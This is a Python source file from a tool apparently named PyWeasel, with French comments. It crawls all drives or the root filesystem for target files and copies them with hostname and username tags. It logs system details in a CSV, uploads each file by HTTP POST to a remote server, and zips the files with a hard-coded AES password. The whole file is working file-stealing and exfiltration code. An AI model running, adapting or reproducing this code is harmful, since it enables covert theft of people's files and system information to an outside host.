import csv
import getpass
import os
import re
import shutil
import socket
import sys
import pyzipper

from pip._vendor import requests
from slugify import slugify
from helpers import find_files, csv_manager

FILENAME = "sfiles.csv"
FIELDS = ['hostname', 'ip', 'proc', 'system', 'os_name', 'machine', 'username', 'file', 'filename', 'expire_date',
          'dl_link']
ZIPNAME = "weasel.zip"


def search_files(files, path='', contains_txt='', exclude_text=''):
    files_found = []
    # Echappe les fichiers ou extensions recherchés et crée une regex
    search_files_regex = '|'.join([re.escape(file) for file in files])

    if os.name == "nt":  # Si on est sur windows
        if path == '':
            for i in drives_letter():
                files_found += find_files.find_path_of_files_in_folder_yield(i + ':/', search_files_regex, contains_txt,
                                                                             True, exclude_text)
        else:
            files_found += find_files.find_path_of_files_in_folder_yield(path, search_files_regex, contains_txt, True,
                                                                         exclude_text)
        return files_found
    elif os.name == "posix":  # Si on est sur posix
        path = '/' if path == '' else path
        files_found += find_files.glob_re(path, search_files_regex)
        return files_found


def sfiles_dir_exist():
    db_path = os.path.join('.', 'sfiles')
    if not os.path.isdir(db_path):
        os.makedirs(db_path)
    return db_path


def drives_letter():
    return ''.join(
        l for l in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:/' % l)) if sys.platform == 'win32' else ''


def copy_files(files):
    filenames = []
    prefix = socket.gethostname() + '_' + getpass.getuser() + '_'
    for file in files:
        if os.path.normpath("PyWeasel") not in file and os.stat(file).st_size >= 1:
            ext = os.path.splitext(file)[1]
            filename = slugify(os.path.splitext(file)[0]) + ext
            shutil.copy(file, os.path.join(sfiles_dir_exist(), filename))
            filenames.append((file, filename))
    return filenames


def send_files(url):
    links = []

    if server_is_up(url):
        # open file in read mode
        with open(csv_manager.FILENAME, 'r') as read_obj:
            # pass the file object to reader() to get the reader object
            csv_reader = csv.DictReader(read_obj, fieldnames=csv_manager.FIELDS, delimiter=';')
            # Iterate over each row in the csv using reader object
            idx = 0
            for row in csv_reader:
                idx += 1
                if idx > 1:
                    with open('sfiles/' + row['filename'], 'rb') as f:
                        r = requests.post(url, files={row['filename']: f})
                        links.append((row['filename'], r.json()['body'][row['filename']]['url']))
        return links
    else:
        print("Error: Your server is down !")


def server_is_up(url, timeout=3):
    try:
        r = requests.head(url, timeout=timeout)
        return True
    except requests.ConnectionError as ex:
        return False


def zip_files():
    with open(FILENAME, 'r') as csvfile:
        reader = csv.DictReader(csvfile, fieldnames=FIELDS, delimiter=';', quoting=csv.QUOTE_MINIMAL)
        files = []
        for row in reader:
            file = row['file']
            if os.path.exists(file):
                files.append(file)

    with pyzipper.AESZipFile(ZIPNAME,
                             'w',
                             compression=pyzipper.ZIP_LZMA,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(b"pyweasel")
        for file in files:
            zf.write(file)

    return ZIPNAME
